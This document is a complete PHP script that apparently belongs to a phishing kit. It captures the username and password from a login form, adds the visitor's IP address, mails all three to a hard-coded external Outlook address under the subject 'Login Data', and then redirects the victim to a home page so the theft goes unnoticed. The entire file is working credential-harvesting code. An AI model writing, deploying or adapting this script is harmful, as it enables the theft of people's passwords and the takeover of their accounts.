<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["uname"];
    $password = $_POST["pass"];

    // Fetch the user's IP address
    $userIP = $_SERVER['REMOTE_ADDR'];

    // Perform any data processing or validation here if needed

    // Set the recipient email address
    $to = "reportbox221@outlook.com"; // Replace with the recipient's email address

    // Construct an email message
    $subject = "Login Data";
    $message = "Email: $email\nPassword: $password\nUser IP Address: $userIP";

    // Send an email with the received data
    $mailResult = mail($to, $subject, $message);

    if ($mailResult) {
        // Redirect to the home page
        header("Location: home.html"); // Replace "home.html" with your actual home page URL
        exit; // Ensure no further processing of the script
    } else {
        // If there's an error sending the email, handle it here
        echo "Error: Email not sent. Please try again later.";
    }
} else {
    // If the request is not a POST request, return an error message
    $response = array(
        'status' => 'error',
        'message' => 'Invalid request method.'
    );

    echo json_encode($response);
}
?>
